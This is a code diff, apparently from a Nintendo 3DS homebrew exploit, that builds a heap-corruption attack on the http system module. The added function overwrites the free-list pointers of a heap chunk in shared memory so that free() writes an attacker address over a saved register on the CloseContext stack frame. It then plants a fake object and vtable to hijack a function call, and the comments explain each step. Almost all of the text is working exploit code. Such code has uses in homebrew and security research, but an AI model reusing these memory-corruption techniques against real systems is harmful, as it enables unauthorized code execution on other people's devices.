@@ -85,11 +85,32 @@ Result locate_sharedmem_linearaddr(u32 **linearaddr)
 	return 0;
 }
 
+void init_hax_sharedmem(u32 *tmpbuf)
+{
+	u32 sharedmembase = 0x10006000;
+	u32 target_overwrite_addr;
+	u32 object_addr = sharedmembase + 0x200;
+	u32 *initialhaxobj = &tmpbuf[0x200>>2];
+
+	target_overwrite_addr = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
+	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.
+
+	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
+	//Once the free() is finished, object_addr will be written to target_overwrite_addr, etc.
+	tmpbuf[0x44>>2] = target_overwrite_addr - 0xc;
+	tmpbuf[0x48>>2] = object_addr;
+
+	//Once http-sysmodule returns into the actual-CloseContext-function, r5 will be overwritten with object_addr. Then it will eventually call vtable funcptr +4 with this object. Before doing so this CloseContext function will write val0 to the two words @ obj+8 and obj+4.
+
+	initialhaxobj[0] = object_addr+0x100;//Set the vtable to sharedmem+0x300.
+	initialhaxobj[1] = object_addr+4;//Set obj+4 to the addr of obj+4, so that most of the linked-list code is skipped over.
+	tmpbuf[(0x300+4) >> 2] = 0x44557788;//Set the funcptr @ vtable+4.
+}
+
 Result writehax_sharedmem_physmem(u32 *linearaddr)
 {
 	u32 chunksize = 0x1000;
-	u8 *tmpbuf;
-	u32 *tmpbuf32;
+	u32 *tmpbuf;
 
 	//Allocate memory for the sharedmem page, then copy the sharedmem physmem data into the buf.
 
@@ -100,22 +121,18 @@ Result writehax_sharedmem_physmem(u32 *linearaddr)
 		return -1;
 	}
 
-	tmpbuf32 = (u32*)tmpbuf;
-
 	memset(tmpbuf, 0, chunksize);
 	GSPGPU_FlushDataCache(tmpbuf, chunksize);
 
-	GX_TextureCopy(linearaddr, 0, (u32*)tmpbuf, 0, chunksize, 0x8);
+	GX_TextureCopy(linearaddr, 0, tmpbuf, 0, chunksize, 0x8);
 	gspWaitForPPF();
 
-	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
-	tmpbuf32[0x44>>2] = 0x40404040;
-	tmpbuf32[0x48>>2] = 0x50505050;
+	init_hax_sharedmem(tmpbuf);
 
 	//Flush dcache for the modified sharedmem, then copy the data back into the sharedmem physmem.
 	GSPGPU_FlushDataCache(tmpbuf, chunksize);
 
-	GX_TextureCopy((u32*)tmpbuf, 0, linearaddr, 0, chunksize, 0x8);
+	GX_TextureCopy(tmpbuf, 0, linearaddr, 0, chunksize, 0x8);
 	gspWaitForPPF();
 
 	linearFree(tmpbuf);
